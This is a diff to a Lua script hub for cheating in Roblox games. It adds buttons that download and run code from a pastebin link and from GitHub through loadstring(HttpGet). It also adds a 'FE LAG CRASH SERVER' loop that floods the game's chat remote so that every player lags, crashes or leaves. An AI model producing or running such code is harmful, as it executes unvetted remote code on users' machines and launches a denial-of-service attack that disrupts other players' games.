@@ -64,6 +64,10 @@ AdminSection:NewButton("Fates Admin", "default prefix :", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
 end)
 
+AdminSection:NewButton("Reviz Admin", "default prefix ; say ;cmds", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/RqaZUrBZ"))()
+end)
+
 local AdminSection = Admin:NewSection("Bonus😁")
 
 AdminSection:NewButton("Nameless Admin", "type ;cmds", function()
@@ -410,6 +414,29 @@ end)
 OvasSection:NewButton("noOoOoOoOoooooOoOo 2", "fling a player by pressing them", function()
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
 end)
+
+OvasSection:NewButton("😈", "😈😈😈😈😈", function()
+-- FE LAG CRASH SERVER | Makes the game lag for every player eventually making them crash or leave.
+-- (Should work on any game with default roblox chat)
+-- YouTube : darkModz
+
+ while wait() do
+local Message = "😈"
+local Unicode = " "
+Message = Message .. Unicode:rep(200 - #Message)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SayMessageRequest = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
+
+if SayMessageRequest then
+    for i = 1, 7 do
+        SayMessageRequest:FireServer(Message, "All")
+    end
+end
+wait(math.random(12,14))
+end
+end)
+
 
 Section:NewKeybind("Toggle", "toggle", Enum.KeyCode.F, function()
 	Library:ToggleUI()
